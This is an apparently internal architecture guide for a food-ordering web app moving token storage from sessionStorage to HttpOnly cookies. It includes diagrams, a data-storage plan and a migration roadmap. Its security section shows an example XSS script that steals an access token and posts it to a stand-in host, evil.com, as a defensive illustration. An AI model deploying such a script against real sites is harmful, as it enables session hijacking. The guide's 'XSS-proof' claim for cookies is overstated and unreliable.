# Architecture Diagrams

## Before: SessionStorage-Based Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                         FRONTEND                                 │
│                                                                  │
│  ┌──────────────┐                                               │
│  │   Browser    │                                               │
│  │              │                                               │
│  │  ┌────────────────────────────────────┐                     │
│  │  │     sessionStorage                 │                     │
│  │  │                                     │                     │
│  │  │  ❌ user: {                        │  ⚠️  Lost on        │
│  │  │      access_token: "eyJ..."         │      tab close     │
│  │  │      refresh_token: "eyJ..."        │                     │
│  │  │    }                                │  ⚠️  Vulnerable     │
│  │  │  ❌ selectedRestaurant: [...]      │      to XSS         │
│  │  │  ❌ cart: [...]                    │                     │
│  │  │  ❌ delivery_address: "..."        │  ⚠️  Not shared     │
│  │  │                                     │      across tabs    │
│  │  └────────────────────────────────────┘                     │
│  │                                                               │
│  │  JavaScript can read tokens  ⚠️ SECURITY RISK               │
│  │  ↓                                                           │
│  │  fetch(url, {                                               │
│  │    headers: {                                               │
│  │      'Authorization': `Bearer ${token}`  ← Manual           │
│  │    }                                                         │
│  │  })                                                          │
│  └──────────────┘                                               │
└──────────────────────────────────────────────────────────────────┘
                            ↓
                    HTTP Request
                    Authorization: Bearer eyJ...
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│                         BACKEND                                  │
│                                                                  │
│  Extract token from Authorization header                        │
│  Validate token                                                 │
│  Return data                                                    │
└──────────────────────────────────────────────────────────────────┘
```

---

## After: HttpOnly Cookie Authentication

```
┌─────────────────────────────────────────────────────────────────┐
│                         FRONTEND                                 │
│                                                                  │
│  ┌──────────────┐                                               │
│  │   Browser    │                                               │
│  │              │                                               │
│  │  ┌────────────────────────────────────┐                     │
│  │  │     Cookies (HttpOnly)             │                     │
│  │  │                                     │                     │
│  │  │  ✅ access_token  [HttpOnly]       │  ✅ Secure          │
│  │  │  ✅ refresh_token [HttpOnly]       │  ✅ XSS-proof       │
│  │  │                                     │  ✅ Auto-sent       │
│  │  │  ❌ JavaScript CANNOT read these   │                     │
│  │  └────────────────────────────────────┘                     │
│  │                                                               │
│  │  ┌────────────────────────────────────┐                     │
│  │  │     localStorage                    │                     │
│  │  │                                     │                     │
│  │  │  ✅ selectedRestaurant: {          │  ✅ Persistent      │
│  │  │      restaurant_id: "...",          │  ✅ Cross-tab       │
│  │  │      name: "...",                   │  ✅ Minimal data    │
│  │  │      address: "..."                 │                     │
│  │  │    }                                │  ✅ No sensitive    │
│  │  │  ✅ cart: [                        │      data           │
│  │  │      {id, name, price, quantity}    │                     │
│  │  │    ]  // NO images/descriptions     │                     │
│  │  │  ✅ delivery_address: "..."        │                     │
│  │  │  ✅ delivery_coordinates: {...}    │                     │
│  │  └────────────────────────────────────┘                     │
│  │                                                               │
│  │  fetch(url, {                                               │
│  │    credentials: 'include'  ← Cookies sent automatically     │
│  │  })                                                          │
│  │  // No manual token management! ✅                          │
│  └──────────────┘                                               │
└──────────────────────────────────────────────────────────────────┘
                            ↓
                    HTTP Request
                    Cookie: access_token=eyJ...; refresh_token=eyJ...
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│                         BACKEND                                  │
│                                                                  │
│  Extract token from Cookie header                               │
│  Validate token                                                 │
│  Return data                                                    │
│  Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Authentication Flow Comparison

### Before (SessionStorage)

```
User Login Flow:
1. User enters email/password
   ↓
2. Frontend: fetch('/login', { body: {email, password} })
   ↓
3. Backend: Validate credentials
   ↓
4. Backend: Generate tokens
   ↓
5. Backend: Return tokens in JSON response
   {
     "access_token": "eyJ...",
     "refresh_token": "eyJ..."
   }
   ↓
6. Frontend: sessionStorage.setItem('user', JSON.stringify(tokens))
   ⚠️ Tokens stored in JavaScript-accessible storage
   ↓
7. Frontend: Manually attach to every request
   fetch(url, {
     headers: { 'Authorization': `Bearer ${token}` }
   })

Problems:
❌ Tokens accessible via JavaScript (XSS vulnerability)
❌ Data lost when tab closes
❌ Manual token management required
❌ No cross-tab synchronization
```

### After (HttpOnly Cookies)

```
User Login Flow:
1. User enters email/password
   ↓
2. Frontend: login(email, password) // from cookieAuth.js
   ↓
3. Frontend: fetch('/login', {
      credentials: 'include',
      body: {email, password}
   })
   ↓
4. Backend: Validate credentials
   ↓
5. Backend: Generate tokens
   ↓
6. Backend: Set HttpOnly cookies
   Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Lax
   Set-Cookie: refresh_token=eyJ...; HttpOnly; Secure; SameSite=Lax
   ↓
7. Browser: Automatically stores cookies
   ✅ JavaScript CANNOT access these
   ↓
8. Frontend: Store non-sensitive data in localStorage
   setSelectedRestaurant(restaurant)
   setCart(cartItems)
   ↓
9. Frontend: Make requests (cookies sent automatically)
   cookieApi.get('/endpoint')
   // Browser automatically includes cookies

Benefits:
✅ Tokens NOT accessible via JavaScript (XSS-proof)
✅ Data persists across sessions
✅ Automatic token management
✅ Cross-tab synchronization
```

---

## API Request Flow

### Before

```
Component wants to fetch orders:

1. Component:
   const user = JSON.parse(sessionStorage.getItem('user'))
   const token = user.access_token
   
2. Component:
   fetch('/orders', {
     headers: {
       'Authorization': `Bearer ${token}`
     }
   })
   
3. Browser → Backend:
   GET /orders
   Authorization: Bearer eyJ...
   
4. Backend:
   Extract: request.headers['Authorization']
   Validate token
   Return data

Problems:
❌ Every component must manage tokens
❌ Risk of token exposure
❌ Boilerplate code everywhere
```

### After

```
Component wants to fetch orders:

1. Component:
   import { cookieApi } from '@/utils/cookieAuth'
   const orders = await cookieApi.get('/orders')
   
2. cookieApi internally:
   fetch('/orders', {
     credentials: 'include'  ← Include cookies
   })
   
3. Browser → Backend:
   GET /orders
   Cookie: access_token=eyJ...; refresh_token=eyJ...
   
4. Backend:
   Extract: request.cookies['access_token']
   Validate token
   Return data

Benefits:
✅ Clean component code
✅ Centralized auth logic
✅ Automatic cookie handling
✅ No token exposure
```

---

## Data Storage Strategy

### Session vs Persistent Data

```
┌─────────────────────────────────────────────────────────────┐
│                    DATA CLASSIFICATION                       │
└─────────────────────────────────────────────────────────────┘

SENSITIVE (HttpOnly Cookies - Backend Managed):
├── access_token           → HttpOnly Cookie
├── refresh_token          → HttpOnly Cookie
└── session_id (optional)  → HttpOnly Cookie

NON-SENSITIVE PERSISTENT (localStorage):
├── selectedRestaurant: {
│   ├── restaurant_id
│   ├── name
│   ├── address
│   ├── city
│   ├── latitude
│   └── longitude
│   }
├── cart: [{
│   ├── id
│   ├── name
│   ├── price
│   ├── quantity
│   ├── specialInstructions (optional)
│   └── selectedAddons (optional)
│   }]
├── delivery_address: string
├── delivery_coordinates: {latitude, longitude}
├── delivery_method: "pickup" | "delivery"
├── orderId: string
├── scheduled_order: boolean
├── order_scheduling_reason: string
└── order_scheduled_delivery: ISO datetime

EXCLUDED FROM STORAGE (Fetch on demand):
├── Product images       → Too large, fetch from API
├── Product descriptions → Too large, fetch from API
├── User password        → NEVER store
└── Credit card info     → NEVER store

TEMPORARY UI STATE (Component state):
├── Form inputs
├── Modal open/close
├── Loading states
└── Error messages
```

---

## Cart Optimization

### Before (Bloated Cart)

```
localStorage.setItem('cart', JSON.stringify([
  {
    id: "123",
    name: "Pancake",
    price: 12,
    quantity: 1,
    image: "data:image/png;base64,iVBORw0KGgoAAAANSUhEU...", // 50KB+
    description: "Delicious pancake with Bueno and fresh strawberries, topped with whipped cream and chocolate sauce...", // Large text
    restaurant_id: "456",
    category: "desserts",
    allergens: [...],
    nutrition: {...}
  },
  // ... more items
]))

Result: 500KB+ localStorage usage
Problem: Exceeds quota, slow performance
```

### After (Optimized Cart)

```
import { setCart } from '@/utils/sessionStorage'

setCart([
  {
    id: "123",
    name: "Pancake",
    price: 12,
    quantity: 1
    // Images, descriptions automatically stripped
  },
  // ... more items
])

Result: ~5KB localStorage usage
Benefit: Fast, efficient, within quota
```

When displaying cart, fetch full product details if needed:
```jsx
const cart = getCart()
const fullCartItems = await Promise.all(
  cart.map(item => 
    cookieApi.get(`/products/${item.id}`)
  )
)
```

---

## Security Comparison

### Attack Vectors

```
┌────────────────────────────────────────────────────────────┐
│                    XSS ATTACK SCENARIO                      │
└────────────────────────────────────────────────────────────┘

BEFORE (SessionStorage):
1. Attacker injects malicious script
   <script>
     const token = JSON.parse(sessionStorage.getItem('user')).access_token
     fetch('https://evil.com/steal', {
       method: 'POST',
       body: token
     })
   </script>
   
2. Token is stolen ❌
3. Attacker can impersonate user ❌

AFTER (HttpOnly Cookies):
1. Attacker injects malicious script
   <script>
     const token = document.cookie  // ← Returns empty
     // HttpOnly cookies NOT accessible via JavaScript
   </script>
   
2. Token is NOT stolen ✅
3. User remains secure ✅
```

---

## File Organization

```
src/
├── utils/
│   ├── cookieAuth.js           ← 🔐 Authentication
│   │   ├── login()
│   │   ├── logout()
│   │   ├── validateSession()
│   │   ├── validateAdmin()
│   │   ├── authenticateWithGoogle()
│   │   ├── fetchWithCookies()
│   │   └── cookieApi.{get,post,put,delete,patch}
│   │
│   └── sessionStorage.js       ← 💾 Session Data
│       ├── Delivery: get/set Address, Coordinates, Method
│       ├── Restaurant: get/set SelectedRestaurant
│       ├── Cart: get/set Cart, OrderId
│       ├── Scheduling: get/set ScheduledOrder, Reason, Time
│       └── Cleanup: clear functions
│
├── context/
│   ├── AuthContext.jsx         ← 👤 Auth State Management
│   │   ├── isLoggedIn
│   │   ├── user
│   │   ├── isAdmin
│   │   ├── updateLoginState()
│   │   └── handleLogout()
│   │
│   └── CartContext.jsx         ← 🛒 Cart State Management
│       ├── cartItems
│       ├── addToCart()
│       ├── removeFromCart()
│       ├── updateQuantity()
│       ├── clearCart()
│       ├── checkout()
│       ├── updateOrder()
│       └── cancelOrder()
│
└── components/
    ├── login-form.jsx          ← Uses cookieAuth.login()
    ├── GoogleLoginButton.jsx   ← Uses cookieAuth.authenticateWithGoogle()
    └── ...                     ← Use useAuth() hook
```

---

## Migration Roadmap

```
Phase 1: PREPARATION (Week 1)
┌─────────────────────────────────────────┐
│ ✅ Create cookieAuth.js                 │
│ ✅ Create sessionStorage.js             │
│ ✅ Create AuthContext.NEW.jsx           │
│ ✅ Create CartContext.NEW.jsx           │
│ ✅ Write documentation                  │
│ ⏳ Backend implements cookie auth       │
│ ⏳ Backend updates CORS                 │
└─────────────────────────────────────────┘
         ↓
Phase 2: CORE UPDATES (Week 2)
┌─────────────────────────────────────────┐
│ ⏳ Replace AuthContext                  │
│ ⏳ Replace CartContext                  │
│ ⏳ Update login-form                    │
│ ⏳ Update GoogleLoginButton             │
│ ⏳ Test authentication flow             │
└─────────────────────────────────────────┘
         ↓
Phase 3: COMPONENT UPDATES (Week 3)
┌─────────────────────────────────────────┐
│ ⏳ Update CheckoutV2.jsx                │
│ ⏳ Update all pages                     │
│ ⏳ Replace sessionStorage calls         │
│ ⏳ Test each component                  │
└─────────────────────────────────────────┘
         ↓
Phase 4: API MIGRATION (Week 4)
┌─────────────────────────────────────────┐
│ ⏳ Replace fetch with cookieApi         │
│ ⏳ Remove manual token management       │
│ ⏳ Deprecate old apiClient.js           │
│ ⏳ End-to-end testing                   │
└─────────────────────────────────────────┘
         ↓
Phase 5: DEPLOYMENT (Week 5)
┌─────────────────────────────────────────┐
│ ⏳ Deploy to staging                    │
│ ⏳ Monitor & fix issues                 │
│ ⏳ Deploy to production                 │
│ ⏳ Clean up old code                    │
└─────────────────────────────────────────┘

Legend:
✅ Complete
⏳ To Do
❌ Blocked
```

---

This visual guide should help understand the architecture changes!
